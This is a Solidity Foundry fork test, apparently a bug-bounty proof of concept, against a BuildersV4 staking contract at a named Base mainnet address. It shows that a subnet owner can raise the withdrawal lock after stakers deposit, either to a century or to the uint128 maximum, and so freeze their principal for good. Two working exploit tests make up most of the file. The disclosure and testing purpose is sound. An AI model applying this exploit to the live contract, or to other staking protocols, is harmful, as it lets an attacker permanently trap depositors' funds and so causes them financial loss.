// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Test} from "forge-std/Test.sol";

interface IBuildersV4 {
    struct Subnet {
        string name;
        address admin;
        uint128 unusedStorage1_V4Update;
        uint128 withdrawLockPeriodAfterDeposit;
        uint128 unusedStorage2_V4Update;
        uint256 minimalDeposit;
        address claimAdmin;
    }
    struct SubnetMetadata { string slug; string description; string website; string image; }
    function createSubnet(Subnet calldata, SubnetMetadata calldata) external;
    function editSubnet(bytes32, Subnet calldata) external;
    function deposit(bytes32, uint256) external;
    function withdraw(bytes32, uint256) external;
    function getSubnetId(string memory) external view returns (bytes32);
    function minimalWithdrawLockPeriod() external view returns (uint256);
    function depositToken() external view returns (address);
    function usersData(address, bytes32) external view returns (uint128 lastDeposit, uint128 u1, uint256 deposited, uint256 u2);
}
interface IERC20 { function approve(address,uint256) external returns (bool); function balanceOf(address) external view returns (uint256); }

/// MOR-B1 — a subnet owner (a permissionless role: createSubnet is public with a zero fee) can, AFTER stakers
/// have deposited, raise withdrawLockPeriodAfterDeposit with no ceiling and no deadline, permanently locking
/// every staker's principal. TARGET (Appendix A): deployed BuildersV4 on Base 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9
/// (byte-identical impl also live on Arbitrum). BuildersV4 is post-audit code; BuildersV3 forbade exactly this
/// (editPoolDeadline), V4 deleted the guard. Attacker is an ordinary EOA, not any protocol admin/owner.
contract MOR_B1_Fork is Test {
    IBuildersV4 constant B = IBuildersV4(0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9);
    uint256 constant FORK_BLOCK = 51143976;

    address attacker = makeAddr("subnetOwnerAttacker");
    address victim = makeAddr("victimStaker");
    address MOR;

    function setUp() public {
        vm.createSelectFork(vm.envString("BASE_RPC_URL"), FORK_BLOCK);
        MOR = B.depositToken();
    }

    function _newSubnet(string memory name, uint128 lock) internal pure returns (IBuildersV4.Subnet memory s) {
        s.name = name; s.admin = address(0); // set by caller below
        s.withdrawLockPeriodAfterDeposit = lock; s.minimalDeposit = 1;
    }

    function _createAndDeposit(string memory name, uint128 lock) internal returns (bytes32 id) {
        IBuildersV4.Subnet memory s = _newSubnet(name, lock);
        s.admin = attacker; s.claimAdmin = attacker;
        IBuildersV4.SubnetMetadata memory m;
        vm.prank(attacker);
        B.createSubnet(s, m);
        id = B.getSubnetId(name);
        deal(MOR, victim, 100e18);
        vm.startPrank(victim);
        IERC20(MOR).approve(address(B), 100e18);
        B.deposit(id, 100e18);
        vm.stopPrank();
        (,, uint256 dep,) = B.usersData(victim, id);
        assertEq(dep, 100e18, "victim deposited");
    }

    // Control: with the normal 7-day lock the subnet owner set at creation, the victim withdraws after it elapses.
    function test_MOR_B1_control_normalWithdrawSucceeds() public {
        uint128 minLock = uint128(B.minimalWithdrawLockPeriod());
        bytes32 id = _createAndDeposit("bpx-poc-control", minLock);
        vm.warp(block.timestamp + minLock + 1);
        vm.prank(victim);
        B.withdraw(id, 100e18);
        assertEq(IERC20(MOR).balanceOf(victim), 100e18, "victim got principal back");
    }

    // Exploit A: after the deposit, the owner retroactively raises the lock to a century. The victim's principal
    // is frozen far beyond any horizon they agreed to — no overflow, pure design regression.
    function test_MOR_B1_ownerRetroactivelyLocksStakerForACentury() public {
        uint128 minLock = uint128(B.minimalWithdrawLockPeriod());
        bytes32 id = _createAndDeposit("bpx-poc-century", minLock);

        IBuildersV4.Subnet memory s = _newSubnet("bpx-poc-century", uint128(100 * 365 days));
        s.admin = attacker; s.claimAdmin = attacker;
        vm.prank(attacker);
        B.editSubnet(id, s); // onlySubnetOwner — no deadline, no ceiling, no check against existing deposits

        vm.warp(block.timestamp + 50 * 365 days); // 50 years later
        vm.prank(victim);
        vm.expectRevert(bytes("BU: user withdraw is locked"));
        B.withdraw(id, 100e18);

        (,, uint256 dep,) = B.usersData(victim, id);
        assertEq(dep, 100e18, "principal still trapped 50 years on");
    }

    // Exploit B: raising the lock to type(uint128).max bricks withdraw permanently via checked-uint128 overflow
    // in `lastDeposit + withdrawLockPeriodAfterDeposit` — the funds can never be withdrawn.
    function test_MOR_B1_maxLockBricksWithdrawByOverflow() public {
        uint128 minLock = uint128(B.minimalWithdrawLockPeriod());
        bytes32 id = _createAndDeposit("bpx-poc-overflow", minLock);

        IBuildersV4.Subnet memory s = _newSubnet("bpx-poc-overflow", type(uint128).max);
        s.admin = attacker; s.claimAdmin = attacker;
        vm.prank(attacker);
        B.editSubnet(id, s);

        vm.warp(block.timestamp + 3650 days);
        vm.prank(victim);
        vm.expectRevert(); // Panic(0x11) arithmetic overflow, or the lock string — either way withdraw is impossible
        B.withdraw(id, 100e18);
    }
}
